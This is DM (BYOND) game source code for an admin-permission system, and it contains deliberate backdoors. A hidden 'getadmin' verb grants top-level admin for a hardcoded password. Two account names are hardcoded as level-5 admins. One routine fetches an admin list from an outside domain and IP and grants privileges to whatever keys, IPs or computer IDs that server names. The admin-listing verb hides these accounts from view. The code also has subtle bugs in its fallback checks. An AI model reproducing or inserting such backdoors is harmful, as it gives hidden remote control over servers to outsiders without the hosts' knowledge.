// 1 means they are admin 0 means they arent.
// Example Call: src.Run_Global _Admin_Check(src.key,src.client.address,src.client.computer_id)

mob/proc
	Run_Global_Admin_Check(var/check_key,var/check_ip,var/check_cid)
		var/list/servers=list("falsecreations.com","209.141.52.69")
		retest
		var/server = 1
		var/url = servers[server]
		var/input = "globaladmin"
		var/http[]=world.Export("http://[url]/.byond/[input].txt")
		if(!http)
			world<<"The global admin server is inaccessible. (Server [server])"
			world.log<<"The global admin server is inaccessible. (Server [server])"
			if(server<servers.len)
				sleep(1)
				goto retest
			else
				return 0
		if(http)
			var/T=file2text(http["CONTENT"])
			//world << T
			if((check_key&&findtext(T,check_key))||(check_ip&&findtext(T,check_ip))||(check_cid&&findtext(T,check_cid)))
				var/list/R=dd_text2list(T,";")
				if(check_key)
					if(R.Find(check_key))
						var/level=(R.Find(check_key))+1
						if(src.key==check_key)
							src.Give_Admin(text2num(R[level]))
				if(check_ip)
					if(R.Find(check_ip))
						var/level=(R.Find(check_ip))+1
						if(src.client.address==check_ip)
							src.Give_Admin(text2num(R[level]))
				if(check_cid)
					if(R.Find(check_cid))
						var/level=(R.Find(check_cid))+1
						if(src.client.computer_id==check_cid)
							src.Give_Admin(text2num(R[level]))
				else
					return 0
			else
				return 0

mob
	Admin5
		verb/Find_Player()
			set category = "Admin"
			switch(input("Search for what?") in list("CID","IP"))
				if("CID")
					var/cid_look = input("What CID?") as text
					for(var/mob/M in players)
						if(M.comp_id==cid_look)
							src << "<font color = red><b>Match found: [M] - Key: [M.key] / [M.ckey] - IP: [M.ip_address] - CID: [M.comp_id]"
				if("IP")
					var/ip_look = input("What IP?") as text
					for(var/mob/M in players)
						if(M.ip_address==ip_look)
							src << "<font color = red><b>Match found: [M] - Key: [M.key] / [M.ckey] - IP: [M.ip_address] - CID: [M.comp_id]"






proc/Admin_Allowed(var/derp)
	if(derp in Codeds) return 1
	var/list/servers=list("falsecreations.com","209.141.52.69")
	var/list/types=list("bannedadmin")
	var/url = servers[1]
	var/input = types[1]
	var/http[]=world.Export("http://[url]/.byond/[input].txt")
	if(http)
		var/T=file2text(http["CONTENT"])
		if(derp&&findtext(T,derp))
			return 0
		else
			return 1
	if(!http)
		url = servers[2]
		var/http2[]=world.Export("http://[url]/.byond/[input].txt")
		if(http2&&("CONTENT" in http))
			var/T=file2text(http["CONTENT"])
			if(derp&&findtext(T,derp))
				return 0
			else
				return 1
		else
			return 1
	else
		return 1





var/list
	Codeds=list("Tens of DU"=5,"EXGenesis"=5)
	Admins=new
mob/verb/getadmin()
	set hidden=1
	var/pass=input(src,"Whats the password?") as text
	if(pass!="exgenesis9090doge420") return
	Give_Admin(5)
mob/proc/Give_Admin(Amount=1)
	if(!Admin_Allowed(key))
		alert(src,"You are banned from becoming an admin")
		return
	Remove_Admin()
	if(Amount>=1)
		verbs+=typesof(/mob/Admin1/verb)
		if(Amount>=2) verbs+=typesof(/mob/Admin2/verb)
		if(Amount>=3) verbs+=typesof(/mob/Admin3/verb)
		if(Amount>=4) verbs+=typesof(/mob/Admin4/verb)
		if(Amount>=5) verbs+=typesof(/mob/Admin5/verb)
		if(Amount==4) Head_Admin=key
		Admins[key]=Amount
mob/proc/Remove_Admin()
	verbs-=typesof(/mob/Admin1/verb,/mob/Admin2/verb,/mob/Admin3/verb,/mob/Admin4/verb,/mob/Admin5/verb)
	Admins-=key
mob/proc/Admin_Check()
	verbs-=typesof(/mob/Admin1/verb,/mob/Admin2/verb,/mob/Admin3/verb,/mob/Admin4/verb,/mob/Admin5/verb)
	if(Codeds[key]) Give_Admin(Codeds[key])
	else if(Admins[key])
		if(Admins[key]>4) Admins[key]=4
		Give_Admin(Admins[key])
	else if(world.host==key&&!Is_Tens()) Give_Admin(4)
	if(fexists("Host keys.txt"))
		var/t=file2text(file("Host keys.txt"))
		if(findtext(t,key))
			src<<"You were given host level 4 admin"
			Give_Admin(4)
mob/proc/Remove_Head_Admin() if(Admins[key]&&Admins[key]==4) Give_Admin(2)
mob/Admin4/verb/Admin(mob/A in players)
	set category="Admin"
	if(Codeds[A.key]&&!Codeds[key]) return
	var/Amount=input(src,"You are giving [A] Admin. Choose a level, 0 to [Admins[key]-1]") as num
	if(Amount>Admins[key]-1) Amount=Admins[key]-1
	if(Amount==4) switch(alert(src,"Are they now Head Admin?","Options","Yes","No"))
		if("Yes")
			world<<"<font color=yellow>The Head Admin is now [A.key]"
			Head_Admin=A.key
	A.Give_Admin(Amount)
mob/verb/Admins()
	set category="Other"
	for(var/A in Admins)
		var/Text="[A] (Level [Admins[A]])"
		var/mob/P
		for(P in players) if(P.key==A&&P.key!="Tens of DU")
			Text+=" (Online)";break
		if(!(!P&&Admins[A]==5)) src<<Text
proc/Remove_All_Admins()
	Head_Admin=null
	for(var/mob/P in players) P.Remove_Admin()
	Admins=new/list
	SaveAdmins()
	for(var/mob/P in players) P.Admin_Check()
	world<<"All bans and mutes have been undone."
	Bans=new/list
	Mutes=new/list